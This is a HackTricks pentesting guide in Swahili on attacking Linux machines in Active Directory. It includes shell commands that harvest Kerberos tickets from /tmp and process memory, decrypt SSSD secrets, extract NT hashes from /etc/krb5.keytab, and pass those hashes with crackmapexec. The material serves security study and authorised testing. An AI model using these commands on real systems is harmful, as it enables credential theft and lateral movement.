# Linux Active Directory

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Mashine ya Linux inaweza kuwepo ndani ya mazingira ya Active Directory.

Mashine ya Linux katika AD inaweza **kuhifadhi tiketi za CCACHE tofauti ndani ya faili. Tiketi hizi zinaweza kutumiwa na kudukuliwa kama tiketi nyingine yoyote ya kerberos**. Ili kusoma tiketi hizi, utahitaji kuwa mmiliki wa mtumiaji wa tiketi au **root** ndani ya mashine.

## Uchunguzi

### Uchunguzi wa AD kutoka kwenye Linux

Ikiwa una ufikiaji juu ya AD kwenye Linux (au bash kwenye Windows) unaweza jaribu [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) kuorodhesha AD.

Pia unaweza kuangalia ukurasa ufuatao kujifunza **njia nyingine za kuorodhesha AD kutoka kwenye Linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA ni **mbadala** wa chanzo wazi kwa Microsoft Windows **Active Directory**, haswa kwa mazingira ya **Unix**. Inaunganisha **directory ya LDAP kamili** na Kituo cha Usambazaji cha **Kerberos** cha MIT kwa usimamizi kama Active Directory. Kwa kutumia Mfumo wa Cheti wa Dogtag kwa usimamizi wa cheti cha CA & RA, inasaidia uwakiki wa **hatua nyingi**, pamoja na kadi za akili. SSSD imeingizwa kwa mchakato wa uwakiki wa Unix. Jifunze zaidi kuhusu hilo katika:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Kucheza na tiketi

### Pass The Ticket

Katika ukurasa huu utapata sehemu tofauti ambapo unaweza **kupata tiketi za kerberos ndani ya mwenyeji wa Linux**, kwenye ukurasa ufuatao unaweza kujifunza jinsi ya kubadilisha muundo wa tiketi za CCache kuwa Kirbi (muundo unahitajika kutumia Windows) na pia jinsi ya kufanya shambulio la PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Matumizi ya tiketi za CCACHE kutoka /tmp

Faili za CCACHE ni muundo wa binary kwa **kuhifadhi sifa za Kerberos** kawaida huhifadhiwa na ruhusa za 600 katika `/tmp`. Faili hizi zinaweza kutambuliwa na **muundo wa jina lake, `krb5cc_%{uid}`,** unaolingana na UID ya mtumiaji. Kwa uthibitisho wa tiketi ya uwakiki, **mazingira ya mazingira `KRB5CCNAME`** yanapaswa kuwekwa kwenye njia ya faili ya tiketi inayotaka, kuruhusu matumizi yake tena.

Angalia tiketi ya sasa inayotumiwa kwa uwakiki na `env | grep KRB5CCNAME`. Muundo ni portable na tiketi inaweza **kutumiwa tena kwa kuweka mazingira ya mazingira** na `export KRB5CCNAME=/tmp/ticket.ccache`. Muundo wa jina la tiketi ya Kerberos ni `krb5cc_%{uid}` ambapo uid ni UID ya mtumiaji.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Matumizi ya tiketi ya CCACHE kutoka kwa keyring

**Tiketi za Kerberos zilizohifadhiwa kwenye kumbukumbu ya mchakato zinaweza kuchimbwa**, haswa wakati ulinzi wa ptrace wa mashine umewezeshwa (`/proc/sys/kernel/yama/ptrace_scope`). Zana muhimu kwa kusudi hili inapatikana kwenye [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), ambayo inafanikisha uchimbaji kwa kuingiza kwenye vikao na kudondosha tiketi kwenye `/tmp`.

Ili kusanidi na kutumia zana hii, hatua zifuatazo zinafuatwa:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Mchakato huu utajaribu kuingiza katika vikao mbalimbali, ikionyesha mafanikio kwa kuhifadhi tiketi zilizopatikana katika `/tmp` kwa mfumo wa jina `__krb_UID.ccache`.


### Matumizi ya tiketi ya CCACHE kutoka SSSD KCM

SSSD inahifadhi nakala ya database katika njia ya `/var/lib/sss/secrets/secrets.ldb`. Funguo husika huhifadhiwa kama faili iliyofichwa katika njia ya `/var/lib/sss/secrets/.secrets.mkey`. Kwa chaguo-msingi, funguo hilo linaweza kusomwa tu ikiwa una **ruhusa ya root**.

Kuita \*\*`SSSDKCMExtractor` \*\* na vigezo vya --database na --key kutapitisha database na **kufichua siri**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Blob la kache ya kitambulisho cha Kerberos inaweza kubadilishwa kuwa faili ya CCache ya Kerberos inayoweza kutumika** ambayo inaweza kupitishwa kwa Mimikatz/Rubeus.

### Matumizi ya tiketi ya CCACHE kutoka kwa keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Pata akaunti kutoka /etc/krb5.keytab

Vidakuzi vya akaunti za huduma, muhimu kwa huduma zinazofanya kazi na mamlaka ya mizizi, hifadhiwa kwa usalama katika faili za **`/etc/krb5.keytab`**. Vidakuzi hivi, kama nywila za huduma, huhitaji siri kali.

Kutathmini maudhui ya faili ya keytab, unaweza kutumia **`klist`**. Zana hii imeundwa kuonyesha maelezo ya ufunguo, ikiwa ni pamoja na **NT Hash** kwa uthibitisho wa mtumiaji, hasa wakati aina ya ufunguo inatambuliwa kama 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Kwa watumiaji wa Linux, **`KeyTabExtract`** inatoa uwezo wa kuchanganua hash ya RC4 HMAC, ambayo inaweza kutumika kwa matumizi ya upya wa hash ya NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Kwenye macOS, **`bifrost`** hutumika kama zana ya uchambuzi wa faili ya keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Kwa kutumia habari ya akaunti na hash iliyopatikana, unaweza kuunganisha kwenye seva kwa kutumia zana kama **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Marejeo
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
